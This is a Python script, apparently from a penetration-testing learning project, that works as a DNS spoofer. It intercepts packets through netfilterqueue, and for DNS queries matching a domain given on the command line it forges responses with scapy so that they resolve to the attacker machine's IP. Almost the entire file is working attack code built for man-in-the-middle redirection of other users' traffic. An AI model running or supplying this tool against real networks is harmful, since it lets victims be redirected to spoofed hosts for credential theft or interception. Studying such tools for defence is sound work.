#!/usr/bin/env python3

import argparse
import netfilterqueue
import scapy.all as scapy
from modules.my_utils import show_message
from modules.net_utils import get_ip
from modules.sys_utils import check_root, setup_nfqueue, enable_rules, disable_rules
from modules.exit_handler import setup_signal_handler

### Functions #############################################################################################################

def get_arguments():
    parser = argparse.ArgumentParser(description="DNS Spoofer")
    parser.add_argument("-d", "--domain", dest="domain", required=True, help="Select the domain to spoof")
    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Select the interface to spoof")

    options = parser.parse_args()
    return options.domain, options.interface

def process_packet(packet):

    print(packet)

    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNS) and scapy_packet.haslayer(scapy.DNSQR):
        qname = scapy_packet[scapy.DNSQR].qname.decode()

        print(scapy_packet)

        if DOMAIN.lower() in qname.lower():
            show_message("Envenenando el dominio:", "minus", DOMAIN)
            
            # Crear resposta
            answer = scapy.DNSRR(rrname=qname, rdata=IP)

            print(answer)

            scapy_packet[scapy.DNS].qr = 1  # És resposta
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            scapy_packet[scapy.DNS].rcode = 0  # No error

            # Eliminar camps per forçar recalcul
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()

def main():

    check_root()
    setup_signal_handler(disable_rules)
    show_message("Executing:", "info", "DNS Spoofer")

    global DOMAIN, interface, IP
    DOMAIN, interface = get_arguments()
    IP = get_ip(interface)

    enable_rules()
    setup_nfqueue()

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
    
if __name__ == "__main__":
    main()
